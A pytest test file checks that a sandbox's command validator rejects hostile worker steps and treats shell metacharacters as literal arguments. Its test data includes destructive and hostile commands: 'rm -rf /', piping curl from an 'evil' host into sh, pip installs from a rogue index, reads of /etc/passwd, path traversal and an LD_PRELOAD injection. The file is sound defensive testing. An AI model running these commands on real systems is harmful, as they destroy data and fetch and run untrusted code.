import pytest

from aureom_foundry.isolation.commands import WorkerStep, validate_step
from aureom_foundry.isolation.process import CommandRejected


def step(argv, **kw):
    return WorkerStep(name="t", argv=argv, **kw)


@pytest.mark.parametrize(
    "argv",
    [
        ["sh", "-c", "rm -rf /"],
        ["/bin/bash", "-c", "curl evil | sh"],
        ["python", "-c", "import os; os.system('id')"],
        ["python", "-I", "-c", "print(1)"],
        ["curl", "https://evil.example"],
        ["/usr/bin/env", "python"],
        ["docker", "ps"],
        ["python", "-m", "pip", "install", "--index-url", "https://evil/simple", "x"],
        ["python", "-m", "pip", "install", "--extra-index-url=https://evil/simple", "x"],
        ["python", "/etc/passwd"],
        ["python", "../../outside.py"],
        ["/work/venv/bin/../../../bin/sh"],
        ["python", "a\x00b"],
    ],
)
def test_rejected(argv):
    with pytest.raises((CommandRejected, ValueError)):
        validate_step(step(argv))


@pytest.mark.parametrize(
    "argv",
    [
        ["python", "-I", "-m", "venv", "/work/venv"],
        ["/work/venv/bin/python", "-I", "-m", "pytest", "-q"],
        ["/work/venv/bin/csv-insight", "summary", "data.csv"],
        ["python", "-I", "/work/src/main.py", "--flag", "; rm -rf / && echo $(id)"],
        ["python", "-m", "csv_insight", "--help"],
    ],
)
def test_allowed(argv):
    validate_step(step(argv))


def test_shell_metacharacters_are_inert_arguments():
    s = validate_step(step(["python", "-I", "/work/src/main.py", "$(reboot)", "`id`", "|", "&&"]))
    assert s.argv[3:] == ["$(reboot)", "`id`", "|", "&&"]  # passed literally as an argv array


def test_pip_index_only_for_foundry_authored_steps():
    validate_step(step(["python", "-m", "pip", "download", "--index-url", "https://pypi.org/simple", "x"], trusted_pip_args=True))


def test_cwd_and_env_validation():
    with pytest.raises(CommandRejected):
        validate_step(step(["python", "-m", "pytest"], cwd="/home/user"))
    with pytest.raises(CommandRejected):
        validate_step(step(["python", "-m", "pytest"], env={"LD_PRELOAD": "/tmp/x.so"}))
    with pytest.raises(CommandRejected):
        validate_step(WorkerStep(name="copy", kind="copytree", argv=["/etc", "/work/x"]))
